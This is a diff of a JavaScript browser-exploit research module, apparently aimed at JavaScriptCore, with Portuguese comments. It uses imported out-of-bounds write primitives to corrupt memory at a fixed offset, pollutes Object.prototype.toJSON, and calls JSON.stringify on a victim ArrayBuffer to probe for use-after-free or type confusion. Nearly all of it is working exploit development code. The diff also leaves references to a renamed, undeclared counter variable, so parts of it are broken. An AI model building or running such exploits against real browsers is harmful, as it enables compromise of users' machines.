@@ -5,206 +5,239 @@ import {
     triggerOOB_primitive, oob_array_buffer_real, oob_dataview_real,
     oob_write_absolute, oob_read_absolute, clearOOBEnvironment
 } from '../core_exploit.mjs';
-import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';
+import { OOB_CONFIG } from '../config.mjs';
 
-const CORRUPT_VICTIM_PARAMS = {
+const TARGETED_UAF_TC_PARAMS = {
     victim_ab_size: 64,
     corruption_offset: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16, // 0x70
-    value_to_write_for_corruption: 0xFFFFFFFF,
+    // value_to_write será passado como parâmetro para executeUAFTypeConfusionTestWithValue
     bytes_to_write_for_corruption: 4,
-    ppKey: 'toJSON',
-    description: "CorruptVictimAndStringify_0x70_FFFF"
+    ppKeyToPollute: 'toJSON',
 };
 
-export let callCount_detailed_toJSON = 0;
-const MAX_toJSON_DEPTH_FOR_PROBING = 10; // Profundidade para sondar 'this'
+export let currentCallCount_for_UAF_TC_test = 0;
+const MAX_toJSON_DEPTH_FOR_ANALYSIS = 10; // Limite de profundidade para detailed_toJSON
 
-// Esta é a toJSON que sonda 'this' e tem controle de profundidade
+// Esta é a toJSON que sonda 'this', tem controle de profundidade e tenta slice na Call 1
 export function detailed_toJSON_for_UAF_TC_test_WithDepthControl_AndSlice() {
-    callCount_detailed_toJSON++;
+    currentCallCount_for_UAF_TC_test++;
     const currentOperationThis = this;
-    const FNAME_toJSON_local = `detailed_toJSON_Probe(Call ${callCount_detailed_toJSON})`;
+    const FNAME_toJSON_local = `detailed_toJSON_DepthCtrlSlice(Call ${currentCallCount_for_UAF_TC_test})`;
 
-    if (callCount_detailed_toJSON === 1 || (callCount_detailed_toJSON % 5 === 0 && callCount_detailed_toJSON <= MAX_toJSON_DEPTH_FOR_PROBING) ) {
-        document.title = `detailed_toJSON_Probe Call ${callCount_detailed_toJSON}/${MAX_toJSON_DEPTH_FOR_PROBING}`;
+    if (currentCallCount_for_UAF_TC_test === 1 || (currentCallCount_for_UAF_TC_test % 5 === 0 && currentCallCount_for_UAF_TC_test <= MAX_toJSON_DEPTH_FOR_ANALYSIS) ) {
+        document.title = `detailed_toJSON_Slice Call ${currentCallCount_for_UAF_TC_test}/${MAX_toJSON_DEPTH_FOR_ANALYSIS}`;
     }
     
-    if (callCount_detailed_toJSON <= MAX_toJSON_DEPTH_FOR_PROBING) {
-        logS3(`[PP - Probe Victim] ${FNAME_toJSON_local} Chamado!`, "vuln");
-        logS3(`  [CALL ${callCount_detailed_toJSON}] typeof this: ${typeof currentOperationThis}, constructor: ${currentOperationThis?.constructor?.name}`, "info");
-        logS3(`  [CALL ${callCount_detailed_toJSON}] Object.prototype.toString.call(this): ${Object.prototype.toString.call(currentOperationThis)}`, "info");
+    if (currentCallCount_for_UAF_TC_test <= MAX_toJSON_DEPTH_FOR_ANALYSIS) {
+        logS3(`[toJSON Poluído - Detalhado c/ Slice] ${FNAME_toJSON_local} Chamado!`, "vuln");
+        logS3(`  [CALL ${currentCallCount_for_UAF_TC_test}] typeof this: ${typeof currentOperationThis}, constructor: ${currentOperationThis?.constructor?.name}`, "info");
     }
 
-    if (callCount_detailed_toJSON > MAX_toJSON_DEPTH_FOR_PROBING) {
-        if (callCount_detailed_toJSON === MAX_toJSON_DEPTH_FOR_PROBING + 1) {
-            logS3(`  [CALL ${callCount_detailed_toJSON}] Profundidade máxima (${MAX_toJSON_DEPTH_FOR_PROBING}) atingida. Retornando undefined.`, "info");
-            document.title = `toJSON Probe Profundidade Máx (${MAX_toJSON_DEPTH_FOR_PROBING})`;
+    if (currentCallCount_for_UAF_TC_test > MAX_toJSON_DEPTH_FOR_ANALYSIS) {
+        if (currentCallCount_for_UAF_TC_test === MAX_toJSON_DEPTH_FOR_ANALYSIS + 1) {
+            logS3(`  [CALL ${currentCallCount_for_UAF_TC_test}] Profundidade máxima (${MAX_toJSON_DEPTH_FOR_ANALYSIS}) atingida. Retornando undefined.`, "info");
+            document.title = `toJSON Profundidade Máx (${MAX_toJSON_DEPTH_FOR_ANALYSIS}) Atingida`;
         }
         return undefined;
     }
 
-    let probe_details = { 
+    let details = { 
         raw_byteLength: "N/A", 
         type_of_raw_byteLength: "N/A",
+        assigned_byteLength: "N/A", 
         first_dword_attempt: "N/A", 
         first_dword_value: "N/A",
         slice_exists: "N/A", 
         slice_call_attempt: "N/A",
         slice_call_result: "N/A",
+        type_toString: "N/A" 
     };
-    let error_during_probing = null;
+    let error_accessing_props = null;
 
     try {
-        probe_details.raw_byteLength = currentOperationThis.byteLength;
-        probe_details.type_of_raw_byteLength = typeof probe_details.raw_byteLength;
-        logS3(`  [CALL ${callCount_detailed_toJSON}] PROBE: this.byteLength: ${probe_details.raw_byteLength} (tipo: ${probe_details.type_of_raw_byteLength})`, "leak");
-
-        probe_details.first_dword_attempt = "Tentado";
-        if (currentOperationThis instanceof ArrayBuffer && typeof probe_details.raw_byteLength === 'number' && probe_details.raw_byteLength >= 4) {
+        details.type_toString = Object.prototype.toString.call(currentOperationThis);
+        
+        details.raw_byteLength = currentOperationThis.byteLength;
+        details.type_of_raw_byteLength = typeof details.raw_byteLength;
+        details.assigned_byteLength = details.raw_byteLength; 
+        logS3(`  [CALL ${currentCallCount_for_UAF_TC_test}] ACCESSO DIRETO this.byteLength: ${details.raw_byteLength} (tipo: ${details.type_of_raw_byteLength})`, "info");
+        
+        details.first_dword_attempt = "Tentado";
+        // Apenas tentar DataView se 'this' for um ArrayBuffer e tiver tamanho suficiente
+        if (currentOperationThis instanceof ArrayBuffer && typeof details.raw_byteLength === 'number' && details.raw_byteLength >=4) {
             try {
-                let dv = new DataView(currentOperationThis, 0, 4);
-                probe_details.first_dword_value = dv.getUint32(0, true);
-                probe_details.first_dword_attempt += ", DataView OK";
-                logS3(`    [CALL ${callCount_detailed_toJSON}] PROBE: 1st DWORD de 'this' (ArrayBuffer): ${toHex(probe_details.first_dword_value)}`, "leak");
+                let buffer_to_inspect = currentOperationThis; // this é ArrayBuffer
+                let offset_to_inspect = 0;
+                details.first_dword_value = new DataView(buffer_to_inspect, offset_to_inspect, 4).getUint32(0, true);
+                details.first_dword_attempt += ", DataView OK";
             } catch (e_dv) {
-                logS3(`    [CALL ${callCount_detailed_toJSON}] PROBE: ERRO ao tentar DataView em 'this' (ArrayBuffer): ${e_dv.message}`, "error");
-                probe_details.first_dword_attempt += `, ERRO DataView: ${e_dv.message}`;
-                error_during_probing = error_during_probing || `DV Error on AB: ${e_dv.message}`;
+                logS3(`  [CALL ${currentCallCount_for_UAF_TC_test}] ERRO ao tentar DataView em 'this' (ArrayBuffer): ${e_dv.message}`, "warn");
+                details.first_dword_attempt += `, ERRO DataView em AB: ${e_dv.message}`;
+                error_accessing_props = error_accessing_props || `DV AB Error: ${e_dv.message}`;
+            }
+        } else if (currentOperationThis && !(currentOperationThis instanceof ArrayBuffer) && typeof details.raw_byteLength === 'number' && details.raw_byteLength >=4 && currentOperationThis.buffer instanceof ArrayBuffer) {
+             // Caso seja um TypedArray com .buffer
+            try {
+                if (currentOperationThis.buffer.byteLength >= (currentOperationThis.byteOffset || 0) + 4) {
+                    details.first_dword_value = new DataView(currentOperationThis.buffer, (currentOperationThis.byteOffset || 0), 4).getUint32(0, true);
+                    details.first_dword_attempt += ", DataView (from .buffer) OK";
+                } else {
+                     details.first_dword_attempt += ", .buffer pequeno ou byteOffset inválido";
+                }
+            } catch (e_dv_buffer) {
+                logS3(`  [CALL ${currentCallCount_for_UAF_TC_test}] ERRO ao tentar DataView em 'this.buffer': ${e_dv_buffer.message}`, "warn");
+                details.first_dword_attempt += `, ERRO DataView em .buffer: ${e_dv_buffer.message}`;
+                error_accessing_props = error_accessing_props || `DV .buffer Error: ${e_dv_buffer.message}`;
             }
         } else {
-            probe_details.first_dword_attempt += ", 'this' não é AB ou byteLength inválido para DV.";
+             details.first_dword_attempt += ", 'this' não é AB/buffer válido para DV";
         }
 
-        probe_details.slice_exists = (typeof currentOperationThis.slice === 'function');
-        probe_details.slice_call_attempt = "Tentado";
-        if (probe_details.slice_exists && currentOperationThis instanceof ArrayBuffer) { // Apenas tentar chamar slice se 'this' for um ArrayBuffer
-            logS3(`  [CALL ${callCount_detailed_toJSON}] PROBE: 'this.slice' existe. Tentando chamar this.slice(0,1)...`, "info");
+        details.slice_exists = (typeof currentOperationThis.slice === 'function');
+        details.slice_call_attempt = "Tentado";
+        // Tentar chamar slice apenas na primeira chamada e se 'this' for um ArrayBuffer
+        if (details.slice_exists && currentOperationThis instanceof ArrayBuffer && currentCallCount_for_UAF_TC_test === 1) {
             try {
+                logS3(`  [CALL ${currentCallCount_for_UAF_TC_test}] 'this.slice' existe (AB). Tentando chamar this.slice(0,1)...`, "info");
                 let slice_result = currentOperationThis.slice(0,1); 
-                probe_details.slice_call_result = `OK, resultado.byteLength = ${slice_result?.byteLength}, tipo resultado: ${typeof slice_result}`;
-                logS3(`    [CALL ${callCount_detailed_toJSON}] PROBE: this.slice(0,1) OK. Result type: ${typeof slice_result}, byteLength: ${slice_result?.byteLength}`, "good");
+                details.slice_call_result = `OK, resultado.byteLength = ${slice_result?.byteLength}, tipo resultado: ${typeof slice_result}`;
+                logS3(`  [CALL ${currentCallCount_for_UAF_TC_test}] this.slice(0,1) OK. Result type: ${typeof slice_result}, byteLength: ${slice_result?.byteLength}`, "info");
             } catch (e_slice) {
-                logS3(`    [CALL ${callCount_detailed_toJSON}] PROBE: ERRO ao chamar this.slice(0,1): ${e_slice.message}`, "error");
-                probe_details.slice_call_result = `ERRO: ${e_slice.message}`;
-                error_during_probing = error_during_probing || `Slice Error: ${e_slice.message}`;
+                logS3(`  [CALL ${currentCallCount_for_UAF_TC_test}] ERRO ao chamar this.slice(0,1) em AB: ${e_slice.message}`, "error");
+                details.slice_call_result = `ERRO em AB: ${e_slice.message}`;
+                error_accessing_props = error_accessing_props || `Slice AB Error: ${e_slice.message}`;
             }
-        } else if (probe_details.slice_exists) {
-            probe_details.slice_call_result = "Existe, mas 'this' não é ArrayBuffer, não chamado.";
+        } else if (details.slice_exists) {
+            details.slice_call_result = "Existe, mas não é AB Call 1, não chamado";
         } else {
-            probe_details.slice_call_attempt += ", 'slice' não é função.";
+             details.slice_call_attempt += ", 'slice' não é função";
         }
         
-        if (error_during_probing) {
-             logS3(`  [CALL ${callCount_detailed_toJSON}] Erro durante probing: ${error_during_probing}`, "error");
-        }
-
-    } catch (e_general_probe) { 
-        error_during_probing = `General Probe Error: ${e_general_probe.message}`;
-        logS3(`  [PP - Probe Victim] ${FNAME_toJSON_local} ERRO GERAL no probing: ${e_general_probe.message} (Call: ${callCount_detailed_toJSON})`, "critical");
-        document.title = `ERRO GERAL toJSON Probe Call ${callCount_detailed_toJSON}`;
+        logS3(`  [CALL ${currentCallCount_for_UAF_TC_test}] Log Final Detalhes: type='${details.type_toString}', assigned_byteLength=${details.assigned_byteLength} (raw_type: ${details.type_of_raw_byteLength}), 1stDwordVal=${(details.first_dword_value === "N/A" || typeof details.first_dword_value === 'string') ? details.first_dword_value : toHex(details.first_dword_value)} (Attempt: ${details.first_dword_attempt}), slice_exists=${details.slice_exists} (Attempt: ${details.slice_call_attempt}, Result: ${details.slice_call_result})`, "info");
+        
+    } catch (e_general) { 
+        error_accessing_props = `General Error: ${e_general.message}`;
+        logS3(`  [toJSON Poluído - Detalhado c/ Slice] ${FNAME_toJSON_local} ERRO GERAL ao acessar props: ${e_general.message} (Chamada: ${currentCallCount_for_UAF_TC_test})`, "critical");
+        document.title = `ERRO GERAL toJSON_DCS Call ${currentCallCount_for_UAF_TC_test}`;
     }
     
-    if (error_during_probing) {
-        throw new Error(`Error during toJSON probe Call ${callCount_detailed_toJSON}: ${error_during_probing}`);
+    if (error_accessing_props) {
+        // Lançar erro para ser pego pelo try...catch em torno do JSON.stringify
+        throw new Error(`Prop Access Error in toJSON_DCS Call ${currentCallCount_for_UAF_TC_test}: ${error_accessing_props}`);
     }
-    // Retornar um objeto simples para que JSON.stringify possa continuar até o limite de profundidade
-    // ou até que um erro real seja lançado e pego pelo catch externo.
-    return { toJSON_probe_call: callCount_detailed_toJSON, this_type: Object.prototype.toString.call(currentOperationThis), details: probe_details };
+    // Retornar um objeto que inclua 'details' para permitir recursão e inspeção
+    return { toJSON_executed_detailed_depth_ctrl_slice: true, call: currentCallCount_for_UAF_TC_test, details: details };
 }
 
+export async function executeUAFTypeConfusionTestWithValue(
+    testVariantDescription,
+    valueToWriteOOB // O valor OOB a ser escrito em TARGETED_UAF_TC_PARAMS.corruption_offset
+) {
+    const FNAME_TEST = `executeUAFTypeConfusionTest<${testVariantDescription}>`;
+    const {
+        victim_ab_size,
+        corruption_offset, 
+        bytes_to_write_for_corruption,
+        ppKeyToPollute,
+    } = TARGETED_UAF_TC_PARAMS; // corruption_offset é 0x70
 
-export async function executeCorruptVictimAndStringify() {
-    const FNAME_TEST_RUNNER = CORRUPT_VICTIM_PARAMS.description;
-    logS3(`--- Iniciando ${FNAME_TEST_RUNNER} ---`, "test", FNAME_TEST_RUNNER);
-    logS3(`   Sondando victim_ab com toJSON detalhada (Max Depth: ${MAX_toJSON_DEPTH_FOR_PROBING})`, "info", FNAME_TEST_RUNNER);
-    document.title = `Iniciando ${FNAME_TEST_RUNNER}`;
+    logS3(`--- Iniciando Teste UAF/TC (Valor Variado OOB, toJSON Detalhada com DepthCtrl+Slice): ${testVariantDescription} ---`, "test", FNAME_TEST);
+    logS3(`   MAX_toJSON_DEPTH_FOR_ANALYSIS = ${MAX_toJSON_DEPTH_FOR_ANALYSIS}`, "info", FNAME_TEST);
+    logS3(`   Alvo da Corrupção OOB: Offset=${toHex(corruption_offset)}, Valor OOB a Escrever=${toHex(valueToWriteOOB)}`, "info", FNAME_TEST);
+    document.title = `Iniciando UAF/TC DCS: ${testVariantDescription}`;
 
-    callCount_detailed_toJSON = 0; // Resetar contador global
+    callCount_detailed_toJSON = 0; // Resetar contador para este teste
+
+    let stringifyResult = null; 
+    let errorOccurredDuringTest = null;
+    let potentiallyFroze = true; 
+    let stepReached = "inicio";
 
     await triggerOOB_primitive();
     if (!oob_array_buffer_real) {
-        logS3("Falha OOB Setup. Abortando.", "error", FNAME_TEST_RUNNER);
-        return { errorOccurred: new Error("OOB Setup Failed"), calls: 0, potentiallyCrashed: false, stringifyResult: null };
+        logS3("Falha ao configurar ambiente OOB. Abortando.", "error", FNAME_TEST);
+        return { potentiallyFroze: false, errorOccurred: new Error("OOB Setup Failed"), calls: callCount_detailed_toJSON, stringifyResult };
     }
-    document.title = `OOB OK - ${FNAME_TEST_RUNNER}`;
+    document.title = "OOB Configurado";
+    stepReached = "oob_configurado";
 
-    // victim_ab é o objeto que será passado para JSON.stringify
-    let victim_ab = new ArrayBuffer(CORRUPT_VICTIM_PARAMS.victim_ab_size);
-    logS3(`ArrayBuffer victim_ab (${CORRUPT_VICTIM_PARAMS.victim_ab_size}b) criado. Este será o 'this' na toJSON.`, "info", FNAME_TEST_RUNNER);
+    let victim_ab = new ArrayBuffer(victim_ab_size); // Este é o objeto que será passado para JSON.stringify
+    logS3(`ArrayBuffer victim_ab (${victim_ab_size} bytes) recriado. Este será o 'this' na 1a chamada da toJSON.`, "info", FNAME_TEST);
+    stepReached = "vitima_criada";
 
-    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, CORRUPT_VICTIM_PARAMS.ppKey);
-    let pollutionApplied = false;
-    let stepReached = "antes_pp";
-    let potentiallyCrashed = true;
-    let errorCaptured = null;
-    let stringifyResult = null;
-
+    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKeyToPollute);
+    let pollutionAppliedThisRun = true; 
+    
     try {
+        logS3(`Aplicando PP com detailed_toJSON_for_UAF_TC_test_WithDepthControl_AndSlice...`, "info", FNAME_TEST);
         stepReached = "aplicando_pp";
-        logS3(`Poluindo Object.prototype.${CORRUPT_VICTIM_PARAMS.ppKey} com detailed_toJSON_for_UAF_TC_test_WithDepthControl_AndSlice...`, "info", FNAME_TEST_RUNNER);
-        document.title = `Aplicando PP Probe Victim - ${FNAME_TEST_RUNNER}`;
-        Object.defineProperty(Object.prototype, CORRUPT_VICTIM_PARAMS.ppKey, {
-            value: detailed_toJSON_for_UAF_TC_test_WithDepthControl_AndSlice,
+        document.title = `Aplicando PP DCS: ${testVariantDescription}`;
+        Object.defineProperty(Object.prototype, ppKeyToPollute, {
+            value: detailed_toJSON_for_UAF_TC_test_WithDepthControl_AndSlice, 
             writable: true, configurable: true, enumerable: false
         });
-        pollutionApplied = true;
-        logS3(`PP aplicada com detailed_toJSON (probe victim).`, "good", FNAME_TEST_RUNNER);
+        logS3(`Object.prototype.${ppKeyToPollute} poluído com detailed_toJSON_for_UAF_TC_test_WithDepthControl_AndSlice.`, "good", FNAME_TEST);
         stepReached = "pp_aplicada";
-        document.title = `PP Probe Victim OK - ${FNAME_TEST_RUNNER}`;
+        document.title = `PP Aplicada DCS: ${testVariantDescription}`;
 
+        logS3(`CORRUPÇÃO OOB: Escrevendo valor ${toHex(valueToWriteOOB)} (${bytes_to_write_for_corruption} bytes) em offset abs ${toHex(corruption_offset)} do oob_array_buffer_real`, "warn", FNAME_TEST);
         stepReached = "antes_escrita_oob";
-        logS3(`CORRUPÇÃO OOB: ${toHex(CORRUPT_VICTIM_PARAMS.value_to_write_for_corruption)} @ ${toHex(CORRUPT_VICTIM_PARAMS.corruption_offset)} (no oob_array_buffer_real)`, "warn", FNAME_TEST_RUNNER);
-        document.title = `Antes OOB Write - ${FNAME_TEST_RUNNER}`;
-        oob_write_absolute(CORRUPT_VICTIM_PARAMS.corruption_offset, CORRUPT_VICTIM_PARAMS.value_to_write_for_corruption, CORRUPT_VICTIM_PARAMS.bytes_to_write_for_corruption);
-        logS3("Escrita OOB feita (no oob_array_buffer_real).", "info", FNAME_TEST_RUNNER);
+        document.title = `Antes Escrita OOB DCS: ${testVariantDescription}`;
+        oob_write_absolute(corruption_offset, valueToWriteOOB, bytes_to_write_for_corruption);
+        logS3("Escrita OOB realizada (no oob_array_buffer_real).", "info", FNAME_TEST);
         stepReached = "apos_escrita_oob";
-        document.title = `Após OOB Write - ${FNAME_TEST_RUNNER}`;
-
-        await PAUSE_S3(SHORT_PAUSE_S3);
+        document.title = `Após Escrita OOB DCS: ${testVariantDescription}`;
+        
+        await PAUSE_S3(SHORT_PAUSE_S3); 
 
         stepReached = "antes_stringify_victim_ab";
-        document.title = `Antes Stringify victim_ab - ${FNAME_TEST_RUNNER}`;
-        logS3(`Chamando JSON.stringify(victim_ab)... (this na toJSON será victim_ab)`, "info", FNAME_TEST_RUNNER);
+        document.title = `Antes Stringify victim_ab DCS: ${testVariantDescription}`;
+        logS3(`Chamando JSON.stringify(victim_ab)... (MAX_DEPTH=${MAX_toJSON_DEPTH_FOR_ANALYSIS})`, "info", FNAME_TEST);
         
         try {
-            stringifyResult = JSON.stringify(victim_ab); // O 'this' na toJSON será o victim_ab
-            stepReached = `apos_stringify_victim_ab`;
-            potentiallyCrashed = false;
-            document.title = `Strfy victim_ab OK - ${FNAME_TEST_RUNNER}`;
-            logS3(`Resultado JSON.stringify(victim_ab): ${String(stringifyResult).substring(0, 300)}... (Chamadas toJSON: ${callCount_detailed_toJSON})`, "info", FNAME_TEST_RUNNER);
-        } catch (e) {
-            stepReached = `erro_stringify_victim_ab`;
-            potentiallyCrashed = false;
-            errorCaptured = e;
-            document.title = `ERRO Strfy victim_ab (${e.name}) - ${FNAME_TEST_RUNNER}`;
-            logS3(`ERRO CAPTURADO JSON.stringify(victim_ab): ${e.name} - ${e.message}. (Chamadas toJSON: ${callCount_detailed_toJSON})`, "critical", FNAME_TEST_RUNNER);
-            if(e.stack) logS3(`   Stack: ${e.stack}`, "error");
-            console.error(`JSON.stringify ERROR for victim_ab (CorruptVictim):`, e);
+            stringifyResult = JSON.stringify(victim_ab);
+            stepReached = "apos_stringify_victim_ab";
+            document.title = `Stringify victim_ab Retornou DCS: ${testVariantDescription}`;
+            potentiallyFroze = false; 
+            logS3(`Resultado JSON.stringify(victim_ab): ${String(stringifyResult).substring(0, 300)}...`, "info", FNAME_TEST);
+        } catch (e_stringify) {
+            stepReached = "erro_stringify_victim_ab";
+            document.title = `ERRO Stringify victim_ab (${e_stringify.name}) DCS: ${testVariantDescription}`;
+            potentiallyFroze = false; 
+            errorOccurredDuringTest = e_stringify;
+            logS3(`ERRO CAPTURADO JSON.stringify(victim_ab): ${e_stringify.name} - ${e_stringify.message}. (Chamadas toJSON: ${callCount_detailed_toJSON})`, "critical", FNAME_TEST);
+            if (e_stringify.stack) logS3(e_stringify.stack, "error", FNAME_TEST);
+            console.error(`JSON.stringify Test Error for victim_ab (${testVariantDescription}):`, e_stringify);
         }
+
     } catch (mainError) {
-        potentiallyCrashed = false;
-        errorCaptured = mainError;
-        logS3(`Erro principal: ${mainError.message}`, "error", FNAME_TEST_RUNNER);
-        document.title = "ERRO Principal CorruptVictim - " + FNAME_TEST_RUNNER;
-        if(mainError.stack) logS3(`   Stack: ${mainError.stack}`, "error");
-        console.error("Main CorruptVictim test error:", mainError);
+        stepReached = "erro_principal";
+        document.title = `ERRO Principal DCS: ${testVariantDescription}`;
+        potentiallyFroze = false;
+        errorOccurredDuringTest = mainError; 
+        logS3(`Erro principal no teste (${testVariantDescription}): ${mainError.message}`, "error", FNAME_TEST);
+        if (mainError.stack) logS3(mainError.stack, "error", FNAME_TEST);
+        console.error("Main test error (DCS):", mainError);
     } finally {
-        if (pollutionApplied) {
-            if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, CORRUPT_VICTIM_PARAMS.ppKey, originalToJSONDescriptor);
-            else delete Object.prototype[CORRUPT_VICTIM_PARAMS.ppKey];
+        if (pollutionAppliedThisRun) { 
+            if (originalToJSONDescriptor) {
+                Object.defineProperty(Object.prototype, ppKeyToPollute, originalToJSONDescriptor);
+            } else {
+                delete Object.prototype[ppKeyToPollute];
+            }
         }
         clearOOBEnvironment();
-        logS3(`Ambiente OOB Limpo. Último passo: ${stepReached}`, "info", FNAME_TEST_RUNNER);
-        if (potentiallyCrashed) {
-             document.title = `CONGELOU? ${stepReached} - ${FNAME_TEST_RUNNER}`;
-             logS3(`O TESTE PODE TER CONGELADO/CRASHADO em ${stepReached}. Chamadas toJSON: ${callCount_detailed_toJSON}`, "error", FNAME_TEST_RUNNER);
+        logS3(`Ambiente OOB Limpo. Último passo: ${stepReached}. Chamadas toJSON: ${callCount_detailed_toJSON}.`, "info", FNAME_TEST);
+        if (potentiallyFroze) {
+            logS3(`O TESTE PODE TER CONGELADO. Último passo: ${stepReached}. Chamadas toJSON: ${callCount_detailed_toJSON}`, "warn", FNAME_TEST);
+            document.title = `CONGELOU? DCS Depth ${MAX_toJSON_DEPTH_FOR_ANALYSIS} Passo: ${stepReached} - Chamadas: ${callCount_detailed_toJSON} - ${testVariantDescription}`;
         }
     }
-    logS3(`--- Teste de Corrupção de Vítima e Stringify Concluído: ${FNAME_TEST_RUNNER} (Chamadas toJSON: ${callCount_detailed_toJSON}) ---`, "test", FNAME_TEST_RUNNER);
-    if (!potentiallyCrashed && !errorCaptured) {
-        document.title = `Teste CorruptVictim OK - ${FNAME_TEST_RUNNER}`;
-    } else if (errorCaptured) {
-        // Título já reflete erro
+    logS3(`--- Teste UAF/TC Concluído: ${testVariantDescription} (MAX_DEPTH=${MAX_toJSON_DEPTH_FOR_ANALYSIS}, Chamadas toJSON: ${callCount_detailed_toJSON}) ---`, "test", FNAME_TEST);
+    if (!potentiallyFroze && !errorOccurredDuringTest) {
+        document.title = `Teste UAF/TC DCS OK: ${testVariantDescription}`;
+    } else if (errorOccurredDuringTest) {
+        // Título já reflete o erro
     }
-    return { potentiallyFroze: potentiallyCrashed, errorOccurred: errorCaptured, calls: callCount_detailed_toJSON, stringifyResult };
+    return { potentiallyFroze, errorOccurred: errorOccurredDuringTest, calls: callCount_detailed_toJSON, stringifyResult };
 }
